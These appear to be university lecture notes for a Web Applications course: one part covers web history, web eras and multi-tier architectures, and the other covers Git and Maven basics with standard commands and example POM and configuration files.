# Introduction to Web Applications — Web Applications 2025-26

## Table of Contents

- [[#A Bit of History|A Bit of History]]
  - [[#Vannevar Bush: The Memex (1945)|Vannevar Bush: The Memex (1945)]]
  - [[#Ted Nelson: Hypertext (1963/1965)|Ted Nelson: Hypertext (1963/1965)]]
  - [[#Douglas Engelbart: NLS System (1962–1968)|Douglas Engelbart: NLS System (1962–1968)]]
  - [[#Halasz/Moran/Trigg: NoteCards (1983–1987)|Halasz/Moran/Trigg: NoteCards (1983–1987)]]
  - [[#Tim Berners-Lee: World Wide Web (1989–1991)|Tim Berners-Lee: World Wide Web (1989–1991)]]
  - [[#Browser Timeline|Browser Timeline]]
- [[#Evolution of the Web|Evolution of the Web]]
  - [[#Web 1.0 — Read Web|Web 1.0 — Read Web]]
  - [[#Web 2.0 — Read/Write Web|Web 2.0 — Read/Write Web]]
  - [[#Web 3.0 — Semantic Web|Web 3.0 — Semantic Web]]
  - [[#Deep Web and Dark Web|Deep Web and Dark Web]]
  - [[#Web3|Web3]]
- [[#Distributed Applications|Distributed Applications]]
  - [[#Application Layers|Application Layers]]
  - [[#Balancing Application Load|Balancing Application Load]]
  - [[#Single-tier Architecture|Single-tier Architecture]]
  - [[#Two-tier Architecture|Two-tier Architecture]]
  - [[#Three-tier Architecture|Three-tier Architecture]]
  - [[#Web Applications as Three-tier|Web Applications as Three-tier]]
  - [[#Web Applications and the Network Stack|Web Applications and the Network Stack]]
- [[#Summary Table|Summary Table]]

---

## A Bit of History

### Vannevar Bush: The Memex (1945)

**Vannevar Bush** (1890–1974), Director of the *Office of Scientific Research and Development* (OSRD).

In July 1945, Bush published *"As We May Think"* in *The Atlantic Monthly* — a visionary article describing the **Memex**, a hypothetical device for storing and retrieving linked information. First conceptual precursor to hypertext and the Web.

### Ted Nelson: Hypertext (1963/1965)

**Theodor Holm Nelson** (born 1937) — philosopher, sociologist, ICT pioneer.

- Coined the term **hypertext** in 1963; first published in print in 1965 (interview at Vassar College, NY)
- **Project Xanadu** (1960–1998): first hypertext project; released open source in 2014
  - Features: *transcopyright*, original context, **bi-directional links**, versioning

### Douglas Engelbart: NLS System (1962–1968)

**Douglas Carl Engelbart** (1925–2013), Augmentation Research Center Lab at Stanford Research Institute.

- **NLS** (*oN-Line System*) — first system to use: mouse, hyperlinks, windows, presentation programs
- **"Mother of All Demos"**: presented at ACM/IEEE Fall Joint Computer Conference, 1968

### Halasz/Moran/Trigg: NoteCards (1983–1987)

- Developed at **Xerox** in LISP; one of the most successful hypertext systems of the era
- Goal: support analysts in **collecting and organising information** to prepare summary reports
- Extensible through a LISP-based programming language

### Tim Berners-Lee: World Wide Web (1989–1991)

- Proposed the Web in **1989** and again in **1990** as a linked information system for managing large project outputs at **CERN**
- Simplified prior hypertext research; perfect "marriage" with the Internet
- Internal CERN development: 1990
- **First website**: 1991 at `http://info.cern.ch/`
- In 1991, a poster about the WWW was accepted at the 3rd ACM Conference on Hypertext

### Browser Timeline

**Early browsers (1990–1993):**

| Year | Browser | Origin | Notes |
|------|---------|--------|-------|
| 1990–1991 | WorldWideWeb/Nexus | Tim Berners-Lee/CERN | WYSIWYG browser/editor on NeXT |
| 1991–1992 | Line Mode Browser | Nicola Pellow/CERN | Text-only; many platforms |
| 1992 | Lynx | University of Kansas | Textual; Unix → multiplatform; still supported |
| 1993 | **Mosaic** | Univ. of Illinois Urbana-Champaign | First graphical multi-platform browser; **popularised the Web** |

**Modern browsers:**

| Year | Browser |
|------|---------|
| 1994 | Netscape Navigator |
| 1995 | Microsoft Internet Explorer |
| 1996 | Opera |
| 1998 | Mozilla Foundation (open source, from Netscape) |
| 2003 | Safari |
| 2004 | Firefox (superseded Netscape Navigator) |
| 2008 | Google Chrome |
| 2015 | Microsoft Edge (superseded Internet Explorer) |

The slide deck also references browser market shares for **January 2026** from W3Counter.

---

## Evolution of the Web

### Web 1.0 — Read Web

> [!Important] Web 1.0 — "Read Web" / Informative Web
> **Period:** roughly 1990–2000
>
> **Key technologies:** HTTP, HTML, MIME, URL
>
> **Main features:**
> - Static web pages
> - Dynamic web pages
> - Web portals
>
> **Intuition:** One-way content flow — a WebMaster/Producer publishes content; Passive Consumers read it.

![[intro-web10.jpg|560]]
*Figure 1: Diagram of Web 1.0 as an informative read-only web*

### Web 2.0 — Read/Write Web

> [!Important] Web 2.0 — "Read/Write Web" / Participative Web
> **Period:** roughly 2000–2010, still ongoing
>
> **Key technologies:** XML, AJAX, JSON
>
> **Main features:**
> - Social media
> - Web services
> - [SOAP]
> - **REST**
>
> **Intuition:** Users both consume and produce content. Web services enable machine-to-machine communication.

### Web 3.0 — Semantic Web

> [!Important] Web 3.0 — "Web of Data" / Intelligent Web
> **Period:** roughly 2010 onwards
>
> *Note: was supposed to be Web 2.0 — the two evolutions happened in different order than anticipated.*
>
> **Key technologies:** RDF, OWL, SPARQL
>
> **Main features:**
> - Machine-processable / machine-executable information
> - Linked (Open) Data
> - Big Data
>
> **Intuition:** Data on the Web has machine-readable semantics — computers can reason over it, not just display it.

### Deep Web and Dark Web

**Deep Web:**
- Web content **not indexed** by standard search engines (login-protected pages, databases, internal systems)
- Raw estimates: about **14 billion raw tables**, coming from **5.4 million schemas** and comprising more than **5.4 million attributes**
- Gartner estimated the relational database market at **$26 billion**, with about **9% annual growth** and an expected **$40 billion market in 2018**
- Estimated ~500× the size of the indexable/surface Web
- Estimated >1 billion structured data sets (as of Feb 2011)
- Exists since Web 1.0; nowadays often confused with the Dark Web

**Dark Web:**
- **Anonymous** and confidential access to Web/Internet
- Uses **onion routing** and strong cryptography
- Tools: *Tor* (anonymous access), *I2P* (anonymous hosting)
- Very often used for illegal activities

### Web3

- **Decentralized** web; data controlled by users, not central platforms
- **Blockchain**-based infrastructure
- Includes: cryptocurrencies, *Decentralized Finance* (DeFi), *Non-Fungible Tokens* (NFT)

---

## Distributed Applications

### Application Layers

> [!Important] Three-Layer Application Model
> Every application is logically divided into three layers:
>
> | Layer | Also Called | Responsibilities |
> |-------|-------------|-----------------|
> | **Presentation Logic** | Interface / User Logic | Manages user interaction; defines format and visualisation of information; accepts and validates user input |
> | **Application Logic** | Business Logic | Defines and controls flow of operations; defines basic data operations and constraints (business rules) |
> | **Data Logic** | — | Manages persistent data storage; searches and retrieves data; ensures data consistency |
>
> **Intuition:** Separation of concerns — each layer has a distinct responsibility. Different architectures decide *where* each layer physically runs.

### Balancing Application Load

The three layers can be distributed across machines in different ways, giving rise to single-tier, two-tier, and three-tier architectures.

![[intro-load-balancing.jpg|560]]
*Figure 2: Example of load balancing between clients, load balancer, and servers*

### Single-tier Architecture

**Terminal/Mainframe** model — all three layers run on the mainframe; terminals are "dumb" (no processing).

| Pros | Cons |
|------|------|
| Easy to implement | Full computational load on mainframe (single point of failure) |
| No client management | Poor scalability |

> [!Example] DUO
> The slides use **DUO** as a visual example of a single-tier architecture.

### Two-tier Architecture

Two variants depending on where the "fat" side lives:

**Fat Client / Server:**
- **Fat client**: Presentation Logic + Application Logic on client
- **Database server**: Data Logic on server
- Client does most processing

![[intro-two-tier-fat-client.jpg|500]]
*Figure 3: Two-tier architecture with a fat client and database server*

> [!Example] Aleph
> The slides use **Aleph** as a visual example of the fat client/server variant.

**Client / Fat Server:**
- **Client**: Presentation Logic only
- **Database + Application server**: Application Logic + Data Logic on server

![[intro-two-tier-fat-server.jpg|440]]
*Figure 4: Two-tier architecture with a more central application server*

| Pros | Cons |
|------|------|
| Easy to implement | Client maintenance |
| Possibility to balance load | Scalability limitations |

### Three-tier Architecture

**Client / Middleware / Server** — three separate tiers:

- **Thin client**: Presentation Logic only
- **Application server**: Application Logic (middleware)
- **Database server(s)**: Data Logic

![[intro-three-tier.jpg|560]]
*Figure 5: Three-tier architecture with presentation, application logic, and data layers*

| Pros | Cons |
|------|------|
| Easy client maintenance | Higher implementation complexity |
| Possibility to balance load | |
| High scalability | |

### Web Applications as Three-tier

> [!Important] Web Applications = Three-tier Architecture
> Web applications are a specific instance of the three-tier architecture:
>
> | Tier | Component |
> |------|-----------|
> | **Thin Client** | Browser (any device) |
> | **Middleware** | Web + Application Server |
> | **Data** | Database Server(s) |
>
> **Main properties:**
> - Based on **standard and ubiquitous** server-side technologies (already in most IT infrastructures)
> - **No client management** required — the client is the browser
> - Clients are **ubiquitous**: desktop and mobile devices
> - Users are **already familiar** with basic interaction patterns (browser navigation, forms, links)
>
> **Intuition:** The browser becomes the universal thin client — no installation, no updates on the user side.

![[intro-webapp-three-tier.jpg|560]]
*Figure 6: Example of a web application organized across three tiers*

> [!Example] Aleph as a Web Application
> The slides also use **Aleph** to illustrate the web-application version of this architecture.

### Web Applications and the Network Stack

> [!Important] HTTP over the Network Stack
> Web app communication maps onto the standard TCP/IP stack:
>
> | Layer | Protocol |
> |-------|---------|
> | Application | **HTTP** |
> | Transport | TCP / UDP |
> | Network | IP |
> | Host-Physical | Physical link |
>
> Client sends **Request** → Server sends **Response** — all carried over HTTP at the application layer.
>
> **Intuition:** HTTP is just an application-layer protocol riding on top of TCP/IP — the same infrastructure used by all Internet services.

![[intro-network-stack.jpg|500]]
*Figure 7: Network stack used by HTTP over TCP/IP*

---

## Summary Table

### Web Evolution

| Era | Period | Technologies | Features |
|-----|--------|-------------|---------|
| **Web 1.0** | ~1990–2000 | HTTP, HTML, MIME, URL | Static/dynamic pages, web portals; one-way content |
| **Web 2.0** | ~2000–2010+ | XML, AJAX, JSON, REST | Social media, web services, user-generated content |
| **Web 3.0** | ~2010+ | RDF, OWL, SPARQL | Semantic/linked data, machine-readable, Big Data |
| **Web3** | present | Blockchain | Decentralized, DeFi, NFT, user-controlled data |

### Architecture Comparison

| Architecture | Tiers | Where Logic Lives | Client Type | Scalability | Complexity |
|---|---|---|---|---|---|
| **Single-tier** | 1 | All on mainframe | Dumb terminal | Low | Low |
| **Two-tier (Fat Client)** | 2 | Pres+App on client; Data on server | Fat client | Medium | Medium |
| **Two-tier (Fat Server)** | 2 | Pres on client; App+Data on server | Thin client | Medium | Medium |
| **Three-tier** | 3 | Separated: client / app server / DB | Thin client | High | High |
| **Web Application** | 3 (special case) | Browser / Web+App server / DB | Browser | High | Medium |

### Key Historical Milestones

| Year | Person/Org | Contribution |
|------|-----------|-------------|
| 1945 | Vannevar Bush | Memex concept — linked information |
| 1963/1965 | Ted Nelson | Coined "hypertext"; Project Xanadu |
| 1962–1968 | Douglas Engelbart | NLS: first mouse, hyperlinks, windows |
| 1983–1987 | Halasz/Moran/Trigg (Xerox) | NoteCards hypertext system |
| 1989–1991 | Tim Berners-Lee (CERN) | World Wide Web proposal, ACM Hypertext poster, first website |
| 1993 | UIUC | Mosaic browser — popularised the Web |
| 2008 | Google | Chrome browser |

## Questions

1. How did early hypertext systems such as Memex, Project Xanadu, NLS, and NoteCards anticipate ideas that later became central to the Web?
2. Why was Tim Berners-Lee's World Wide Web successful compared with earlier hypertext systems, especially in relation to the Internet?
3. How did graphical browsers such as Mosaic change the adoption and usability of the Web?
4. How would you compare Web 1.0, Web 2.0, Web 3.0, and Web3 in terms of technologies, users, and data ownership?
5. What is the difference between the Semantic Web idea of Web 3.0 and the blockchain-based idea of Web3?
6. How do the Deep Web and the Dark Web differ, and why is confusing them conceptually misleading?
7. What responsibilities belong to presentation logic, application logic, and data logic in a distributed application?
8. How does load distribution change when moving from single-tier to two-tier and then to three-tier architectures?
9. Why does the fat client variant of two-tier architecture create maintenance problems compared with a thin client architecture?
10. Why are web applications considered a specific case of three-tier architecture?
11. What advantages does the browser provide as a universal thin client for web applications?
12. How does the web application diagram map browsers, web/application servers, and database servers to the three logical layers?
13. How does HTTP fit into the TCP/IP network stack, and why is it described as an application-layer protocol?
14. If a web application becomes slow under load, which tier or layer would you investigate first, and what evidence would guide that decision?
15. How do scalability and implementation complexity trade off across single-tier, two-tier, three-tier, and web application architectures?

# Git and Maven

## Table of Contents

- [[#Git — Version Control System|Git — Version Control System]]
  - [[#Centralized vs Distributed Approaches|Centralized vs Distributed Approaches]]
  - [[#Creating and Cloning a Repository|Creating and Cloning a Repository]]
  - [[#Workflow — The Three Local Areas|Workflow — The Three Local Areas]]
  - [[#Add, Commit, Push|Add, Commit, Push]]
  - [[#Branch Management|Branch Management]]
  - [[#Update and Merge|Update and Merge]]
  - [[#Pull Requests|Pull Requests]]
  - [[#.gitignore File|.gitignore File]]
  - [[#README File|README File]]
- [[#Maven — Build and Dependency Management|Maven — Build and Dependency Management]]
  - [[#Main Concepts|Main Concepts]]
  - [[#Build Lifecycle|Build Lifecycle]]
  - [[#Default Build Lifecycle — Phases|Default Build Lifecycle — Phases]]
  - [[#Default Build Lifecycle for JAR|Default Build Lifecycle for JAR]]
  - [[#Project Object Model (POM)|Project Object Model (POM)]]
  - [[#Maven Repositories|Maven Repositories]]
  - [[#settings.xml Configuration|settings.xml Configuration]]
  - [[#Running Maven|Running Maven]]
  - [[#Project Directory Structure|Project Directory Structure]]
  - [[#Complete POM — Project Without Dependencies|Complete POM — Project Without Dependencies]]
  - [[#POM with External Dependencies|POM with External Dependencies]]
- [[#Complete Workflow — Maven + Git Project Setup|Complete Workflow — Maven + Git Project Setup]]
- [[#Summary Table|Summary Table]]

---

## Git — Version Control System
![[Pasted image 20260512202324.png|300]]
*Figure 1: Comparison between centralized and distributed version control*

**Git** is a distributed version control system (https://git-scm.com/). It manages versions (*revisions*) of files and directories, concurrent modification conflicts, and their resolution (**merge**).

### Centralized vs Distributed Approaches

> [!Important] Centralized vs Distributed
> - **Centralized** (*CVS*, *SVN*): single central repository; the client uses a local copy and synchronizes with the center.
> - **Distributed** (*Git*): the local copy of each client **is a complete repository**; synchronization happens by exchanging patches between peers.
>
> Development is modeled as a **directed graph**: alternative lines (**branches**) and/or stable versions (**tags**) start from the main line (`master`).

### Creating and Cloning a Repository

```bash
# Create a new repository in the current folder
git init

# Clone an existing repository
git clone username@host:/path/to/repos
```

### Workflow — The Three Local Areas

> [!Important] The three Git areas
> The local copy is composed of three "trees":
> 1. **Working Directory** — actual files and directories (they may be unversioned)
> 2. **Index (Stage)** — staging area, intermediate between the working dir and HEAD
> 3. **HEAD** — points to the last commit made
>
> **Insight:** you work in the working dir → add to the stage with `add` → consolidate into history with `commit`.

![[git-workflow-three-trees.jpg|560]]
*Figure 2: Flow between working directory, staging area, and HEAD*

### Add, Commit, Push

```bash
# Add files/directories to the Index
git add <filename>

# Commit the changes and add them to HEAD
git commit -m "Description"

# Send the commits to the remote server
git push origin master
```

- `origin` — default remote repository (the one it was cloned from)
- `master` (or another name) — branch to send to the server

### Branch Management

> [!Important] Branch
> Branches are used to develop independent features (e.g. new versions). The **master** branch is the default one. The other branches are merged into master when appropriate.

![[git-branch-merge.jpg|580]]
*Figure 3: Creation of a feature branch and merge back into the main branch*

```bash
# Create and switch to a new branch
git checkout -b <branch-name>

# Return to master (or any other branch)
git checkout master

# Send a branch to the remote repository
git push origin <branch-name>
```

### Update and Merge

```bash
# Update the local repository from the remote one
git pull origin <branch-name>

# Merge a branch into the current branch
git merge <branch-name>
```

### Pull Requests

> [!Important] Pull Request
> Mechanism provided by platforms such as *GitHub* and *Bitbucket* to encourage collaboration. A developer notifies colleagues that they have completed a feature: everyone reviews and discusses the code, and then it is merged into master.
> **Insight:** it is a formal review request before the merge — not a `git pull`.

### .gitignore File

It must be placed in the project's **root folder**. It specifies patterns of files/directories that Git must **ignore** (not track).

> [!Example] Example .gitignore for a Java/Maven project
> ```gitignore
> # IntelliJ Idea
> *.iml
> .idea/
>
> # Package Files
> *.jar
> *.war
> *.ear
> *.zip
> *.tar.gz
> *.rar
>
> # Java compiled
> *.class
> target/
> javadoc/
>
> # OSX
> .DS_Store
>
> # Logs
> log/
> ```
> **Explanation:** `target/` and `javadoc/` are generated by Maven and must not be versioned. `.class` files are compilation artifacts.

### README File

It must be placed in the **root folder**. It provides general information about the project, displayed on the repository web page. It uses **Markdown** syntax (`.md`).

> [!Example] Example README.md
> ```markdown
> # Web Applications (webapp)
>
> This directory contains the source code distribution complementing the lectures.
>
> Web Applications lectures are held at:
>
> * Master Degree in Computer Engineering
> * Master Degree in ICT for Internet and Multimedia
> * Master Degree in Cybersecurity
>
> of the Department of Information Engineering, University of Padua, Italy
>
> Copyright and license information can be found in the file LICENSE.
> Additional information can be found in the file NOTICE.
> ```

All code examples are available in the Bitbucket repository `https://bitbucket.org/frrncl/webapp-unipd`, which can be cloned and pulled as it gets updated.

---

## Maven — Build and Dependency Management

**Maven** (from Yiddish: *accumulator of knowledge*) started as an attempt to simplify build processes in the Jakarta Turbine project, a servlet-based framework for secure web applications. Maven is a tool for managing Java software projects and tracking the status of a project. Homepage: `http://maven.apache.org/`.

It covers:
- **build** — compilation, packaging
- **dependency management** — automatic library management
- **deployment and packaging**
- **collaboration and documentation**

Advantages:
- **Coherence / consistency**: standardizes Java project management, increases transparency, and reduces the time needed to understand projects in an organization
- **Reuse**: similar projects can reuse and extend the setup of previous projects
- **Simplicity**: simplifies creation/integration of new components and sharing of packages and executables; reduces the learning curve for each project
- **Maintenance**: reduces effort and resources needed to maintain build scripts and development/deployment environments

### Main Concepts

> [!Important] Fundamental Maven concepts
> - **Lifecycle**: sequence of **phases** (*phase*) to build the software
> - **Phase**: stage of the lifecycle; associated with zero or more **goals**
> - **Goal**: concrete operation executed in a phase; implemented by a **plugin**
> - **Plugin**: component that implements one or more goals
> - **POM** (*Project Object Model*): single XML file that declaratively describes the project's phases, goals, and plugins
>
> **Insight:** lifecycle > phase > goal > plugin. The POM is the project's "manifest".

![[maven-phases-goals-plugins-pom.jpg|580]]
*Figure 4: Relationship between Maven phases, goals, plugins, and the POM file*

### Build Lifecycle

A build lifecycle is needed to create, compile, integrate, test, and distribute a software project.

Three predefined lifecycles:

| Lifecycle | Purpose |
|---|---|
| `clean` | Deletes the files generated by a previous build |
| `default` | Manages the entire development of the project |
| `site` | Creates the project site and documentation |

> [!Important] Sequential execution of phases
> Invoking a phase **executes all previous phases** of that lifecycle.
> If you invoke the last phase, **all phases** of that lifecycle are executed.
> Example: `mvn package` executes validate → compile → test → package.

### Default Build Lifecycle — Phases

| Group | Main phases | Description |
|---|---|---|
| **Setup** | `validate` | Verifies project correctness and information availability |
| | `initialize` | Initializes build state (properties, directories) |
| **Source** | `generate-sources` | Generates source code |
| | `process-sources` | Processes the source (e.g. filters) |
| | `generate-resources` | Generates resources to include in the package |
| | `process-resources` | Copies resources to the destination directory |
| | `compile` | Compiles the project's source |
| | `process-classes` | Post-processes the `.class` files (e.g. bytecode enhancement) |
| **Testing** | `generate-test-sources` | Generates test sources |
| | `process-test-sources` | Processes test sources |
| | `generate-test-resources` | Creates resources for tests |
| | `process-test-resources` | Copies resources to the test directory |
| | `test-compile` | Compiles the test source |
| | `process-test-classes` | Post-processes the test `.class` files |
| | `test` | Runs tests with a framework (e.g. JUnit); does not require packaging |
| **Packaging** | `prepare-package` | Prepares packaging |
| | `package` | Packages the code (e.g. JAR, WAR) |
| **Integration** | `pre-integration-test` | Prepares the environment for integration tests |
| | `integration-test` | Deploys and runs integration tests |
| | `post-integration-test` | Cleans up after integration tests |
| **Deployment** | `verify` | Verifies package validity and quality |
| | `install` | Installs the package in the local repository |
| | `deploy` | Copies the package to the remote repository (release environment) |
![[Pasted image 20260512202851.png|520]]
*Figure 5: Overview of Maven lifecycles and their phases*

### Default Build Lifecycle for JAR

```
process-resources  →  compile  →  process-test-resources  →  test-compile
     (resources:resources)  (compiler:compile)  (resources:testResources)  (compiler:testCompile)

→  test  →  package  →  install  →  deploy
   (surefire:test)  (jar:jar)  (install:install)  (deploy:deploy)
```

*(note: each phase shows the plugin:goal associated by default)*

### Project Object Model (POM)

![[Pasted image 20260512114735.png|500]]
*Figure 6: Logical structure of a Maven POM file*

> [!Important] POM — Main sections
> - **Coordinates**: uniquely identify the project in the repository
>   - `groupId`: id of the "producer" (e.g. reverse domain `it.unipd.dei.webapp`)
>   - `artifactId`: project name
>   - `version`: project version
>   - `packaging`: output format (`jar` for desktop, `war` for web)
> - **Relationships**: project structure through coordinates/modules, dependencies on other projects/libraries, and inheritance
> - **General project information**: project name, website, organization, developers, licenses, and contributors
> - **Build Settings**: customizes the lifecycle (build, directories, extensions, resources, plugins, reporting)
> - **Build Environment**: profiles for different environments/OSs

### Maven Repositories

> [!Important] Maven Repository
> Maven downloads dependencies and plugins from **remote repositories** (Maven Central, Sonatype, other repositories) and keeps them in a **local cache** (`~/.m2/repository`).
> If a dependency is not in the cache, Maven automatically downloads it from the configured remote repository.
![[Pasted image 20260512114820.png|500]]
*Figure 7: Role of settings.xml in Maven configuration*

### settings.xml Configuration

The `~/.m2/settings.xml` file contains Maven's global configuration:
- where to store the local cache
- configuration of local repositories and access credentials

It must be saved in the `.m2` folder in the user's home directory; if it does not exist, it has to be created.

> [!Example] Minimal settings.xml example
> ```xml
> <settings xmlns="http://maven.apache.org/SETTINGS/1.0.0"
>   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
>   xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.0.0
>     http://maven.apache.org/xsd/settings-1.0.0.xsd">
>
>   <localRepository>/Users/ferro/.m2/repository</localRepository>
>
> </settings>
> ```

### Running Maven

```bash
mvn [options] [<goal(s)>] [<phase(s)>]
```

- `phase`: name of a phase; **all previous phases are executed**
- `goal`: in the form `<plugin-name>:<goal-name>`

> [!Example] Composite Maven command
> ```bash
> mvn clean deploy checkstyle:check
> ```
> Executes:
> 1. `clean` phase of the *clean* lifecycle
> 2. `deploy` phase (+ all previous phases) of the *default* lifecycle
> 3. `check` goal of the `checkstyle` plugin

### Project Directory Structure

```
project/
├── src/
│   ├── main/
│   │   ├── database/     ← SQL (e.g. schema creation)
│   │   ├── java/         ← Java sources
│   │   ├── resources/    ← resources (property files, etc.)
│   │   └── webapp/       ← web sources (HTML, CSS, JS)
│   └── test/             ← tests (e.g. JUnit)
├── javadoc/              ← generated documentation
├── target/               ← compiled code and generated packages
├── pom.xml
├── .gitignore
└── README.md
```

*(note: Maven follows **convention over configuration** — if this standard structure is used, there is no need to specify the directories in the POM)*

### Complete POM — Project Without Dependencies

> [!Example] pom.xml — HelloWorld JAR without dependencies
> ```xml
> <?xml version="1.0"?>
> <project xmlns="http://maven.apache.org/POM/4.0.0"
>          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
>          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
>            http://maven.apache.org/xsd/maven-4.0.0.xsd">
>   <modelVersion>4.0.0</modelVersion>
>
>   <!-- Coordinates -->
>   <groupId>it.unipd.dei.webapp</groupId>
>   <artifactId>hello-world</artifactId>
>   <version>1.00</version>
>   <packaging>jar</packaging>
>
>   <!-- General info -->
>   <name>Hello World</name>
>   <description>Writes "Hello, world!" on the console</description>
>   <url>http://www.dei.unipd.it/en/</url>
>   <inceptionYear>2018</inceptionYear>
>
>   <developers>
>     <developer>
>       <id>nf</id>
>       <name>Nicola Ferro</name>
>       <email>ferro@dei.unipd.it</email>
>       <url>http://www.dei.unipd.it/~ferro/</url>
>     </developer>
>   </developers>
>
>   <licenses>
>     <license>
>       <name>The Apache Software License, Version 2.0</name>
>       <url>http://www.apache.org/licenses/LICENSE-2.0.txt</url>
>       <distribution>repo</distribution>
>     </license>
>   </licenses>
>
>   <organization>
>     <name>Department of Information Engineering (DEI), University of Padua, Italy</name>
>     <url>http://www.dei.unipd.it/en/</url>
>   </organization>
>
>   <properties>
>     <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
>   </properties>
>
>   <build>
>     <defaultGoal>compile</defaultGoal>
>     <sourceDirectory>${basedir}/src/main/java</sourceDirectory>
>     <directory>${basedir}/target</directory>
>     <finalName>${project.artifactId}-${project.version}</finalName>
>
>     <plugins>
>       <!-- Java 1.8 Compiler -->
>       <plugin>
>         <groupId>org.apache.maven.plugins</groupId>
>         <artifactId>maven-compiler-plugin</artifactId>
>         <version>3.7.0</version>
>         <configuration>
>           <source>1.8</source>
>           <target>1.8</target>
>         </configuration>
>       </plugin>
>
>       <!-- Javadoc Generation -->
>       <plugin>
>         <groupId>org.apache.maven.plugins</groupId>
>         <artifactId>maven-javadoc-plugin</artifactId>
>         <version>3.0.0</version>
>         <configuration>
>           <reportOutputDirectory>${basedir}/javadoc</reportOutputDirectory>
>           <author>true</author>
>           <nosince>false</nosince>
>           <show>protected</show>
>         </configuration>
>       </plugin>
>     </plugins>
>   </build>
> </project>
> ```
> **Key notes:**
> - `${basedir}` — Maven variable for the project root
> - `<sourceDirectory>` and `<directory>` define the source-code folder and the generated-class/output folder; they can be omitted when the default Maven directory structure is used (**convention over configuration**)
> - `<finalName>` defines the name of the generated JAR/WAR package file
> - `<show>protected</show>` — Javadoc includes `protected` and `public` methods/fields
> - `<defaultGoal>compile</defaultGoal>` — goal executed by `mvn` with no arguments

> [!Example] HelloWorld class
> ```java
> package it.unipd.dei.webapp;
>
> /**
>  * Sample class to say "Hello, world".
>  *
>  * @author Nicola Ferro (ferro@dei.unipd.it)
>  * @version 1.0
>  * @since 1.0
>  */
> public class HelloWorld {
>
>   /**
>    * Main method of the class.
>    *
>    * Just prints "Hello, world!".
>    *
>    * @param args input arguments from the command line, if any.
>    */
>   public static void main(String[] args) {
>     System.out.printf("Hello, world!%n");
>   }
> }
> ```

### POM with External Dependencies

JFiglet repository: `https://github.com/dtmo/jfiglet`. The dependency coordinates can be found through Maven Central Search: `http://search.maven.org/`.

> [!Example] HelloWorldFiglet class behavior
> The application:
> - prints the list of available Figlet fonts and exits if no argument is provided;
> - stores the selected Figlet font name;
> - parses the command line by switching on the first argument after `trim().toLowerCase()`;
> - throws `IllegalArgumentException` for an invalid Figlet font;
> - creates a `FigletRenderer`, renders `"Hello, world!"`, and prints the ASCII-art output.

> [!Example] pom.xml — adding JFiglet dependency + jar-with-dependencies
> **Context:** add the JFiglet library (ASCII art) as a dependency and create a standalone JAR (fat jar) that includes all dependencies.
> ```xml
> <!-- In the <build><plugins> section -->
> <plugin>
>   <artifactId>maven-assembly-plugin</artifactId>
>   <version>3.3.0</version>
>   <configuration>
>     <descriptorRefs>
>       <descriptorRef>jar-with-dependencies</descriptorRef>
>     </descriptorRefs>
>   </configuration>
>   <executions>
>     <execution>
>       <id>make-assembly</id>
>       <phase>package</phase>       <!-- bound to the package phase -->
>       <goals>
>         <goal>single</goal>        <!-- single goal of the assembly plugin -->
>       </goals>
>     </execution>
>   </executions>
> </plugin>
>
> <!-- <dependencies> section -->
> <dependencies>
>   <dependency>
>     <groupId>com.github.dtmo.jfiglet</groupId>
>     <artifactId>jfiglet</artifactId>
>     <version>1.0.1</version>
>   </dependency>
> </dependencies>
> ```
> **Explanation:**
> - `maven-assembly-plugin` with `jar-with-dependencies` creates a *fat JAR* that also contains third-party libraries → executable without external dependencies
> - The `single` goal is bound to the `package` phase: it is executed automatically with `mvn package`
> - The dependency coordinates (`groupId`, `artifactId`, `version`) are found at http://search.maven.org/

> [!Warning] Fat JAR vs plain JAR
> Without `maven-assembly-plugin`, the produced JAR does not contain the dependencies. Running it results in `ClassNotFoundException`.
> **Mitigation:** use `jar-with-dependencies` or specify the classpath at runtime.

---

## Complete Workflow — Maven + Git Project Setup

1. Configure `~/.m2/settings.xml` (only once)
2. Create a repository on Bitbucket/GitHub
3. Clone locally: `git clone ...`
4. Add `.gitignore` and `README.md`
5. Create the directory structure and `pom.xml`
6. Develop the code in `src/main/java/`
7. Build: `mvn clean package`
8. Generate Javadoc: `mvn javadoc:javadoc`
9. Push: `git add`, `git commit`, `git push origin master`

---

## Summary Table

| Git Command | Effect |
|---|---|
| `git init` | Creates a new local repository |
| `git clone <url>` | Clones an existing repository |
| `git add <file>` | Adds a file to the Index (stage) |
| `git commit -m "msg"` | Moves from Index to HEAD |
| `git push origin <branch>` | Sends commits to the remote |
| `git pull origin <branch>` | Updates the local repository from the remote |
| `git merge <branch>` | Merges a branch into the current branch |
| `git checkout -b <name>` | Creates and switches to a new branch |
| `git checkout <name>` | Switches to an existing branch |

| Maven Command | Effect |
|---|---|
| `mvn clean` | Deletes `target/` (previous output) |
| `mvn compile` | Compiles Java sources |
| `mvn test` | Runs tests (JUnit) |
| `mvn package` | Creates a JAR/WAR in `target/` |
| `mvn install` | Installs the package in the local `.m2` repo |
| `mvn deploy` | Publishes the package to a remote repo |
| `mvn javadoc:javadoc` | Generates Javadoc in `javadoc/` |
| `mvn clean package` | Cleans and packages again |

| Maven Concept | Description |
|---|---|
| `groupId` | Producer ID (e.g. `it.unipd.dei.webapp`) |
| `artifactId` | Project name |
| `version` | Package version |
| `packaging` | Output format: `jar` (desktop) or `war` (web) |
| `<dependency>` | External library downloaded from the Maven repository |
| `<plugin>` | Component that implements goals in a phase |
| `<phase>` | Stage of the lifecycle; executed in sequence |
| `<goal>` | Concrete operation (`plugin:goal`) |
| POM | `pom.xml` — declarative XML file for the project |
| settings.xml | `~/.m2/settings.xml` — global Maven configuration |

## Questions

1. How does Git's distributed model differ from a centralized version control system, and why does this difference matter for collaboration?
2. In the Git workflow diagram, what roles do the working directory, the Index/Stage, and HEAD play, and how do `git add` and `git commit` move changes between them?
3. How would you explain the difference between creating a new repository with `git init` and obtaining an existing one with `git clone`?
4. What happens conceptually when a feature branch diverges from `master` and is later merged back, as shown in the branch diagrams?
5. Why are branches useful for independent development, and what risks or conflicts can appear when merging them?
6. How is a pull request different from the `git pull` command, and why is this distinction important in a team workflow?
7. Why should generated files such as `target/`, `.class` files, and packaged archives usually be listed in `.gitignore` for a Java/Maven project?
8. What information should a README provide in a repository, and how does it support collaboration or project reuse?
9. How are Maven lifecycles, phases, goals, and plugins related to each other, and how does the POM coordinate them?
10. Why does invoking a Maven phase such as `package` also execute previous phases, and what practical effect does this have on the build process?
